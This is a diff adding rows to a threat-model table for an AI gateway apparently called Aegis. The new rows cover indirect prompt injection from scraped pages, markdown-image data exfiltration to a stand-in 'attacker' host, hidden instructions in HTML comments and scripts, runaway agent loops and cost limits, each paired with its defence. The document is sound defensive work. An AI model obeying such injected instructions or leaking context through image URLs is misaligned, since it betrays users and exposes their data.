@@ -9,6 +9,11 @@ controls it implements, and what is intentionally out of scope.
 | --- | --- |
 | Employee pastes a customer SSN/PHI/credit card into an AI tool. | Inbound detector + severity-based action (`block` for HIPAA/PCI; `redact` otherwise). |
 | Service account hard-codes an API key in a prompt. | Secret detectors (`aws_access_key`, `github_token`, `openai_key`, `slack_token`, `private_key_block`, `jwt`) flagged as high severity. |
+| **Indirect prompt injection from a scraped webpage** — page tells the model to ignore instructions, exfiltrate context via `![](attacker/?leak=…)`, or impersonate a system role. | `aegis/policy/injection.py` runs on every request *and* every response; `<aegis:untrusted>` wrapping (or `X-Aegis-Untrusted: 1`) elevates all such findings to HIGH so they get blocked by `baseline`. Hidden Unicode tag chars and zero-width payloads are stripped before forwarding. |
+| **Markdown-image data exfiltration in the model's reply** (renderer GETs the URL, leaking the prompt). | Outbound scan blocks/redacts `markdown_image_exfil` findings before the response reaches the client. |
+| **Hidden instructions in HTML comments / `<script>` blocks / data URIs** in scraped pages. | Dedicated detectors for each. |
+| **Runaway agent loop** runs up the user's bill. | `aegis/safety/loops.py` blocks identical-prompt repetition (default 8/120s) with explicit `X-Aegis-Override-Loop` to proceed (logged). |
+| **Forgotten cost guardrail** on a customer's bot lets it spend $1000s. | `aegis/safety/budgets.py` enforces always-on per-key and per-tenant budgets on requests and **estimated USD**; over-limit requests return HTTP 429 with explicit override instructions. |
 | AI provider returns content that includes leaked credentials. | Outbound re-scan + redaction before the response reaches the client. |
 | Engineer routes around the gateway by calling OpenAI directly. | Egress firewall + DNS controls block direct provider IPs; only the gateway is allowed to reach them. (Aegis is the *only* identity holding the real upstream key.) |
 | Insider exfiltrates data via prompt history. | All requests/responses produce append-only `AuditEvent` rows; SIEM ingest via JSON logs. |
